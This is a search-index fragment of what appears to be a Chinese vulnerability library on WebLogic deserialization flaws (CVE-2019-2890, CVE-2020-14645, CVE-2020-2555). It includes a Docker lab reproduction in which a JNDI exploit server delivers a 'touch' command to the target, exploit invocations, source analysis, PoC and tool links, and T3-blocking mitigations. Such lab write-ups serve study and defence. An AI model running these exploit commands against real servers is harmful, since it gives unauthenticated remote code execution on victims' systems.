<p>https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/","title":"Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1eCVE-2019-2890","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u4e25\u91cd</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#poc","title":"\u6f0f\u6d1ePoC\u5982\u4e0b","text":"<p>\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1V9Gq6V4yItIP5Et1wSfWsQ \u63d0\u53d6\u7801\uff1a8cx6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_4","title":"\u5b89\u5168\u5efa\u8bae","text":"<p>\u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 1. \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 2. \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 3. \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 :https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/","title":"WebLogic UniversalExtractor\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE 2020 14645)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#weblogic-universalextractorcve-2020-14645","title":"WebLogic UniversalExtractor\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2020-14645)","text":"<p>\u7b80\u4ecb</p> <p>WebLogic \u662f\u7f8e\u56fd Oracle \u516c\u53f8\u7684 Java \u5e94\u7528\u670d\u52a1\u5668\uff0c\u786e\u5207\u8bf4\u662f\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u88ab\u7528\u4e8eWEB\u5e94\u7528\u3001\u6570\u636e\u5e93\u5e94\u7528\u7b49\u7684\u96c6\u6210\u5f00\u53d1\u90e8\u7f72\u3002</p> <p>WebLogic \u7684 T3 \u534f\u8bae\u6613\u88ab\u5229\u7528\uff0c\u4ece\u800c\u91c7\u7528 JNDI \u6ce8\u5165\u3001\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u76ee\u6807\u3002</p> <p>\u5b58\u5728\u5b89\u5168\u7f3a\u9677\u7684\u7248\u672c\uff1aWebLogic12.2.1.4.x\uff0c\u3010JDK\u7248\u672c\uff1a6u211\u4ee5\u4e0b\uff1b7u201\u4ee5\u4e0b\uff1b8u191\u4ee5\u4e0b\u3011\u3002\u672c\u6587\u4f7f\u7528JDK1.8.0_181\u3002</p> <p>1.3 \u6f0f\u6d1e\u6316\u6398\u80fd\u529b\u6761\u4ef6</p> <p>\u8ba4\u4e3a\u5e94\u638c\u63e1JNDI\u6ce8\u5165\u65b9\u6cd5\uff0c\u5e76\u6e05\u6670WebLogic\u7684coherence\u6e90\u7801\u7684\u903b\u8f91\u529f\u80fd\u3002</p> <p>1.4 \u5229\u7528\u65b9\u6cd5</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#141","title":"1.4.1 \u73af\u5883","text":"<p>\u5728 WIN10 \u7684 WSL2 \u4e0b\u7528 docker \u955c\u50cf weblogic122140jdk8u181new:latest\u3001ubuntu \u521b\u5efa\u4e09\u4e2a\u5bb9\u5668\uff0c\u79f0\u4e3aweblogic122140jdk8u181new\u3001ubuntu-JNDI\u3001ubuntu-gongji\uff0c\u4f5c\u7528\u5206\u522b\u4e3aWebLogic \u670d\u52a1\u5668\u3001JNDI\u670d\u52a1\u5668\u3001\u653b\u51fb\u673a\u3002</p> <p>\u5bf9\u4e8e weblogic122140jdk8u181new \u5bb9\u5668\u3010ip:172.17.0.2\u3011\u7684\u751f\u6210\u8fc7\u7a0b\uff0c\u9700\u8981\u8fdb\u5165\u3010WeblogicEnvironment\u3011\u6587\u4ef6\u5939\uff0c\u53c2\u7167\u3010https://github.com/QAX-A-Team/WeblogicEnvironment\u3011\u65b9\u6cd5\u5373\u53ef\u751f\u6210\uff0c\u547d\u4ee4\u662f\uff1a</p> <pre><code>docker build --build-arg JDK_PKG=jdk-8u181-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.2.1.4.0_wls_lite_generic.jar  -t weblogic122140jdk8u181new .\n</code></pre> <pre><code>docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic122140jdk8u181new weblogic122140jdk8u181new\n</code></pre> <p>\u5bf9\u4e8e\u7531 ubuntu \u955c\u50cf\u751f\u6210\u7684 ubuntu-JNDI \u5bb9\u5668\u3010ip:172.17.0.3\u3011\uff0c\u5c06 jdk-8u181-linux-x64.tar.gz\u3001JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\u62f7\u8d1d\u81f3\u5bb9\u5668\u5185\uff0c\u53c2\u7167\u3010https://www.cnblogs.com/hellojesson/p/11684299.html\u3011\u5b89\u88c5\u597djdk\uff0c\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/CVE -A 172.17.0.3\n</code></pre> <p>\u5bf9\u4e8e\u7531ubuntu\u955c\u50cf\u751f\u6210\u7684ubuntu-gongji\u5bb9\u5668\u3010ip:172.17.0.4\u3011\uff0c\u5c06jdk-8u181-linux-x64.tar.gz\u3001CVE-2020-14645.jar\u62f7\u8d1d\u81f3\u5bb9\u5668\u5185\uff0c\u53c2\u7167\u3010https://www.cnblogs.com/hellojesson/p/11684299.html\u3011\u5b89\u88c5\u597djdk\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#142","title":"1.4.2 \u76ee\u6807","text":"<p>\u5728 WebLogic \u670d\u52a1\u5668\u6267\u884c\u4ee3\u7801\u3010touch /tmp/CVE\u3011\uff0c\u4ece\u800c\u5728 tmp \u6587\u4ef6\u5939\u4e0b\u751f\u6210 CVE \u6587\u4ef6\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#143","title":"1.4.3 \u590d\u73b0","text":"<p>ubuntu-JNDI \u5bb9\u5668\u4f1a\u8f93\u51fa\u53ef\u5229\u7528\u7684 LDAP \u94fe\u63a5\uff0c\u672c\u6b21\u8f93\u5165\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u200b                      </p> <p>\u5219\u5728\u653b\u51fb\u673a ubuntu-gongji \u5bb9\u5668\u4e2d\u8f93\u5165\u8f6c\u53d1\u7c7b\u547d\u4ee4\u5982\u4e0b\uff1a</p> <p></p> <p>\u6ce8\u610f\u6807\u7ea2\u4f4d\u7f6e LDAP \u94fe\u63a5\u5c3e\u90e8\u662f\u968f\u673a\u4ea7\u751f\u7684\uff0c\u6bcf\u6b21\u5747\u4e0d\u4e00\u6837\u3002</p> <p>weblogic122140jdk8u181new \u5bb9\u5668\u4f1a\u51fa\u73b0\u7ecf\u4ee3\u7801\u6267\u884c\u540e\u751f\u6210\u7684\u6587\u4ef6\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#144","title":"1.4.4 \u5206\u6790\u65b9\u6cd5\u3010\u7701\u7565\u90e8\u5206\u4ee3\u7801\u5206\u6790\u3011","text":"<p>\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u4f1a\u8df3\u8f6c\u81f3\u4e0b\u56fe\u7ea2\u6846\u4e2d\u7684 coherence \u5e93\u4e2d\u6267\u884c\u90e8\u5206\u529f\u80fd\u3002</p> <p>com.tangosol.util.extractor.UniversalExtractor \u7c7b\u4e2d\uff1a</p> <p>protected transient String m_sNameCanon;</p> <p>private transient TargetReflectionDescriptor m_cacheTarget;</p> <p>private transient boolean m_fMethod;</p> <p>com.tangosol.util.extractor.UniversalExtractor#extract \u65b9\u6cd5\u4e2d\u7684 com.tangosol.util.extractor.UniversalExtractor#extractComplex\u65b9\u6cd5\u4e2d\uff1a</p> <pre><code>Class clzTarget = oTarget.getClass();\nClass[] clzParam = ClassHelper.getClassArray(aoParam);\nString sCName = this.getCanonicalName();#\u3010\u65e0\u53c2\u7684\u51fd\u6570\u6216\u7a7a\u503c\u3011\nboolean fProperty = this.isPropertyExtractor();\nMethod method = null;\nif (fProperty) {#\u3010\u65b9\u6cd5\u5bf9\u8c61\u7684\u83b7\u53d6\u53ea\u6709\u4e00\u4e2a\u6761\u4ef6\u3011\n            String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);\u3010\u9996\u5b57\u6bcd\u5927\u5199\u3011\n\n\n            for(int cchPrefix = 0; cchPrefix &lt; BEAN_ACCESSOR_PREFIXES.length &amp;&amp; method == null; ++cchPrefix) {\n                method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);\u3010\u5bf9\u7531get/is+\u5b57\u7b26\u7ec4\u6210\u7684\u65b0\u5b57\u7b26\u8fdb\u884c\u5904\u7406\u3011\u3010ClassHelper.findMethod\u67e5\u627e\u4e0e\u6307\u5b9a\u7c7b\u3001\u65b9\u6cd5\u540d\u79f0\u548c\u53c2\u6570\u5339\u914d\u7684\u91cd\u8981\u65b9\u6cd5\u3011\u3010\u6307\u5b9a\u51fd\u6570\u5fc5\u987b\u7531\u201cget\u201d\u6216\u201cis\u201d\u5f00\u5934\uff0c\u4e14\u65e0\u53c2\u3011\n            }\n        } else {\n            method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false);\n        }\n</code></pre> <p>\u521d\u6b65\u8ba4\u4e3a\uff0c\u8fdb\u5165 else \u5206\u652f\u4e2d\uff0c\u5373\u53ef\u8c03\u7528\u4efb\u610f\u65b9\u6cd5\uff0c\u524d\u63d0\u662f fProperty \u4e3afalse\u3002</p> <p>\u7ecf\u7814\u7a76\uff0cfProperty \u7531 !this.m_fMethod \u51b3\u5b9a\uff0c\u5176\u8d4b\u503c\u5982\u4e0b init() \u51fd\u6570\uff1a</p> <pre><code>    protected void init() {\n        String sCName = this.getCanonicalName();\n        this.m_fMethod = sCName == null || sCName.endsWith(\"()\");#\u3010sCName\u4e3a\u65e0\u53c2\u51fd\u6570\u65f6\u7b26\u5408\u8981\u6c42\u3011\n}\n</code></pre> <p>fProperty \u65b9\u9762\uff0c\u5f53 sCName \u4e0d\u662f\u65e0\u53c2\u51fd\u6570\u4e14\u975e\u7a7a\u65f6\uff0cfProperty \u4e3a true\u3002</p> <p>\u7ee7\u7eed\u5206\u6790 String sCName = this.getCanonicalName();\uff0c\u8ffd\u6eaf\u5230\u7c7bcom.oracle.common.internal.util.CanonicalNames \u7684\u65b9\u6cd5com.oracle.common.internal.util.CanonicalNames#computeValueExtractorCanonicalName(java.lang.String, java.lang.Object[])\uff1a</p> <pre><code>public static String computeValueExtractorCanonicalName(String sName, Object[] aoParam) {#\u3010\u6b64\u65b9\u6cd5\u8981\u6c42\u51fd\u6570\u5fc5\u987b\u662f\u65e0\u53c2\u7684\u3011\n        int nMethodSuffixLength = \"()\".length();\n        if (aoParam != null &amp;&amp; aoParam.length &gt; 0) {\n            return null;#\u3010\u53c2\u6570\u975e\u7a7a\u5219\u8fd4\u56de\u7a7a\u3011\n        } else if (!sName.endsWith(\"()\")) {\n            return sName; #\u3010\u51fd\u6570\u540d\u4e0d\u4ee5\u201c()\u201d\u7ed3\u5c3e\u5219\u8fd4\u56de\u51fd\u6570\u540d\u3011\n        } else {\n            String sNameCanonical = sName;\n            int nNameLength = sName.length();\n            String[] var5 = VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES; #\u3010\u201cget\u201d\uff0c\u201cis\u201d\u3011\n            int var6 = var5.length;\n\n\n            for(int var7 = 0; var7 &lt; var6; ++var7) {\n                String sPrefix = var5[var7];\n                int nPrefixLength = sPrefix.length();\n                if (nNameLength &gt; nPrefixLength &amp;&amp; sName.startsWith(sPrefix)) {\n                    sNameCanonical = Character.toLowerCase(sName.charAt(nPrefixLength)) + sName.substring(nPrefixLength + 1, nNameLength - nMethodSuffixLength); #\u3010\u51fd\u6570\u540d\u524d\u51e0\u4f4d\u662f\u201cget\u201d/\u201cis\u201d\uff0c\u53bb\u9664\u5c3e\u90e8\u201c()\u201d\u3011\n                    break;\n                }\n            }\n\n\n            return sNameCanonical;\n        }\n    }\n</code></pre> <p>\u7efc\u4e0a\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u3002</p> <ul> <li>\u65b9\u6cd51\uff1a\u5bfb\u627e\u4ee5 \u201cget\u201d/\u201cis\u201d \u5f00\u5934\u7684\u51fd\u6570\u540d\u3002\u3010\u673a\u4f1a\u8f83\u5c0f\u3011</li> <li>\u65b9\u6cd52\uff1a\u4f7f fProperty \u4e3a false\uff0c\u5219\u9700\u5bfb\u627e\u4ee5\u201cget\u201d/\u201cis\u201d\u5f00\u5934\u7684\u65e0\u53c2\u51fd\u6570\u3002\u3010\u673a\u4f1a\u5f88\u5c0f\u3011</li> <li>\u65b9\u6cd53\uff1a\u89c2\u5bdf extract \u5728 compare \u51fd\u6570\u4e2d\u88ab\u8c03\u7528\u4e86\u4e24\u6b21\uff0c\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u503c\u53d1\u751f\u53d8\u5316\uff0c\u4ece\u800c\u4ea7\u751f\u7f3a\u9677\u3002\u3010\u7ecf\u9a8c\u8bc1\u65e0\u6548\u3011</li> </ul> <p>\u5bf9\u4e8e\u65b9\u6cd51\uff0c\u53ef\u627e\u5230\u5408\u89c4\u51fd\u6570\u540d\uff0c\u518d\u627e\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff08\u4f8b\u5982\uff0c\u63a7\u5236dataSource\uff0c\u5c31\u80fd\u63a7\u5236javax.sql.rowset.BaseRowSet#getDataSourceName\uff0c\u8fdb\u884cJNDI\u6ce8\u5165\u3002</p> <p>1.5 \u8865\u4e01\u5206\u6790</p> <p>\u6682\u65e0\u3002</p> <p></p> <p>1.6 docker\u590d\u73b0</p> <p>\u52a0\u8f7d\u5bb9\u5668tar\u4e3a\u955c\u50cf\uff0c\u4f8b\u5b50\uff1a</p> <ul> <li></li> </ul> <pre><code>cat ./ubuntu-xxx.tar | docker import - ubuntu-new\n</code></pre> <p>\u8bbe\u7f6e\u5c40\u57df\u7f51\u53ca\u5bb9\u5668ip\u3001\u542f\u52a8\u5bb9\u5668\uff0c\u4f8b\u5b50\uff1a</p> <p>\uff081\uff09\u81ea\u5b9a\u4e49\u7f51\u7edc</p> <ul> <li></li> </ul> <pre><code>docker network create --subnet=192.168.10.1/24 testnet\n</code></pre> <p>\uff082\uff09\u542f\u52a8 docker \u5bb9\u5668</p> <ul> <li></li> </ul> <pre><code>docker run -p 8088:8088 -p 8081:8081 -it --name testt3 --hostname testt3 --network testnet --ip 10.10.10.100 ubuntuxxx:xxx /bin/bash\n</code></pre> <p>\u5f53\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\u7684ip\u662f172.17.0.3\u3001\u5bb9\u5668\u3010ubuntu-gongji1106\u3011\u7684ip\u662f172.17.0.5\u3001\u5bb9\u5668\u3010weblogic122140jdk8u181new1106\u3011\u7684ip\u662f172.17.0.4\u65f6\uff0c</p> <p>\u542f\u52a8 weblogic \u670d\u52a1\u3002\u8fdb\u5165\u5bb9\u5668\u3010weblogic122140jdk8u181new1106\u3011\uff0c\u8f93\u5165\u547d\u4ee4</p> <ul> <li></li> </ul> <pre><code>sh /u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh\n</code></pre> <p>\u542f\u52a8\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u3002</p> <p></p> <p>\u542f\u52a8 JNDI \u670d\u52a1\u3002\u8fdb\u5165\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\uff0c\u4f9d\u6b21\u8f93\u5165\u547d\u4ee4</p> <ul> <li></li> </ul> <pre><code>source /etc/profile\n</code></pre> <ul> <li></li> </ul> <pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/CVE110667 -A 172.17.0.3\n</code></pre> <p>\u53ef\u77e5\u9002\u7528\u4e8e jdk1.8 \u7684 JNDI \u8bbf\u95ee\u94fe\u63a5\u4e3a\u3010ldap://172.17.0.3:1389/usns1q\u3011\uff0c\u5982\u4e0b\u56fe\u3002</p> <p></p> <p>\u53d1\u8d77\u653b\u51fb\u3002\u8fdb\u5165\u5bb9\u5668\u3010ubuntu-gongji1106\u3011\uff0c\u4f9d\u6b21\u8f93\u5165\u547d\u4ee4</p> <ul> <li></li> </ul> <pre><code>source /etc/profile\n</code></pre> <ul> <li></li> </ul> <pre><code>java -jar CVE-2020-14645.jar 172.17.0.3:1389/usns1q http://172.17.0.4:7001\n</code></pre> <p>\u201c172.17.0.3:1389/usns1q\u201d\u90e8\u5206\u4e3aJNDI\u94fe\u63a5\uff0c\u653b\u51fb\u6210\u529f\u4f1a\u8fd4\u56deweblogic\u7248\u672c\uff0c\u5982\u4e0b\u56fe\u3002</p> <p></p> <p>\u653b\u51fb\u6210\u529f\u540e\uff0c\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\u4f1a\u663e\u793a\u4f20\u8f93\u4fe1\u606f\uff0c\u5982\u4e0b\u56fe\u3002</p> <p></p> <p>\u653b\u51fb\u6210\u529f\u540e\uff0cweblogic\u670d\u52a1\u5668\u4f1a\u751f\u6210\u3010CVE\u3011\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\u3002</p> <p></p> <p>1.7 \u53c2\u8003\u8d44\u6599</p> <ul> <li>https://www.chainnews.com/articles/884170141841.htm</li> <li>https://www.freebuf.com/vuls/251540.html</li> <li>https://github.com/QAX-A-Team/WeblogicEnvironment</li> <li>https://paper.seebug.org/1012/#weblogic</li> <li>https://cloud.tencent.com/developer/article/1608010</li> <li>https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</li> <li>https://paper.seebug.org/1280/#cve-2020-14645</li> <li>https://www.anquanke.com/post/id/210724</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20coherence%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-2555%29%E5%A4%8D%E7%8E%B0/","title":"WebLogic coherence\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE 2020 2555)\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20coherence%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-2555%29%E5%A4%8D%E7%8E%B0/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>Oracle Coherence\u4e3aOracle\u878d\u5408\u4e2d\u95f4\u4ef6\u4e2d\u7684\u4ea7\u54c1\uff0c\u5728WebLogic 12c\u53ca\u4ee5\u4e0a\u7248\u672c\u4e2d\u9ed8\u8ba4\u96c6\u6210\u5230WebLogic\u5b89\u88c5\u5305\u4e2d\uff0cT3\u662f\u7528\u4e8e\u5728WebLogic\u670d\u52a1\u5668\u548c\u5176\u4ed6\u7c7b\u578b\u7684Java\u7a0b\u5e8f\u4e4b\u95f4\u4f20\u8f93\u4fe1\u606f\u7684\u534f\u8bae\u3002</p> <p>\u8be5\u6f0f\u6d1e\u5141\u8bb8\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020T3\u7f51\u7edc\u534f\u8bae\u8bf7\u6c42\u8fdb\u884c\u653b\u51fb\uff0c\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u5b9e\u73b0\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u4f7f\u7528\u4e86Oracle Coherence\u5e93\u7684\u4ea7\u54c1\u53d7\u6b64\u6f0f\u6d1e\u5f71\u54cd\uff0c\u5728WebLogic Server 11g Release\uff0810.3.4\uff09\u53ca\u4ee5\u4e0a\u7248\u672c\u7684\u5b89\u88c5\u5305\u4e2d\u9ed8\u8ba4\u96c6\u6210\u4e86Oracle Coherence\u5e93\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20coherence%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-2555%29%E5%A4%8D%E7%8E%B0/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Oracle Coherence 3.7.1.17</p> <p>Oracle Coherence 12.1.3.0.0</p> <p>Oracle Coherence 12.2.1.3.0</p> <p>Oracle Coherence 12.2.1.4.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20coherence%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-2555%29%E5%A4%8D%E7%8E%B0/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a</p> <p>payload\u751f\u6210(\u8be5git\u9879\u76ee\u6709\u5df2\u751f\u6210\u7684payload\u53ef\u7528\uff0c\u4e5f\u53efdump\u9879\u76ee\u540e\u672c\u5730\u6839\u636e\u81ea\u5df1\u9700\u8981\u4fee\u6539\u547d\u4ee4)</p> <pre><code>https://github.com/Maskhe/cve-2020-2555\n</code></pre> <p></p> <p>\u5982\u8fc7\u60f3\u4fee\u6539\u9ed8\u8ba4\u7684\u547d\u4ee4\uff0c\u53ef\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f</p> <p>\u5bfc\u5165\uff1aysoserialCoherence.jar\u5305</p> <p>\u5bfc\u5165\uff1aMain.java\u9879\u76ee</p> 